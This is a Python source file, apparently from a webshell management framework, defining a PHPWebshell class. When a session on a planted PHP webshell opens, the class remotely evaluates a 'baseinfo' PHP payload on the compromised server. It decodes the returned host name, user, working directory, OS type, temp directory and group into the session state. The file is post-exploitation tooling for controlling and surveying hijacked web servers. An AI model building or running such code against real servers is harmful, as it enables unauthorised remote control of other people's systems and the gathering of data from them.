
from src.core.webshell import Webshell
from src.core.session import WebshellSession
from src.core.payload import PHPPayload
from src.logger import logger
import json
import os
import base64

class PHPWebshell(Webshell):

    def __init__(self):
        super().__init__()

    def _to_php_errcode(self, code):
        '''将错误代码转为可读的错误标识
        '''
        code = int(code)
        if code >= 65535: # 如果是异常，一般需要webshell将异常代码加上65535以便和错误代码相区分
            return "PHP Exception"
        if (1|4|16|64|256|4096)&code:
            return "PHP Error"

        return "PHP Warning"

    def hook_start(self, session: WebshellSession):
        '''当session创建成功时执行'''
        super().hook_start(session)
        p = PHPPayload('php/base/baseinfo.php')
        ret = self.eval(p)
        if not ret.is_success():
            logger.error("Basic info gather failed!")
            return
        info = json.loads(ret.data)
        for k, v in info.items():
            if isinstance(v, str):
                info[k] = base64.b64decode(v.encode()).decode(self.options.encoding, 'ignore')
        session.state['name'] = info['host']
        session.state['pwd'] = info.get('pwd').strip()
        session.state['description'] = self.help.lstrip('\r\n ').split('\n')[0]
        session.server_info.lang = self.PHP
        session.server_info.user = info.get('user').strip()
        session.server_info.webshell_root = info.get('pwd').strip()
        session.server_info.os_type = info.get('os_type').strip()
        session.server_info.tmpdir = info.get('tmpdir').strip()
        session.server_info.sep = info.get('sep').strip()
        session.server_info.domain = info.get('domain')
        session.server_info.group = info.get('group')
        session.server_info.os_bits = info.get('os_bits')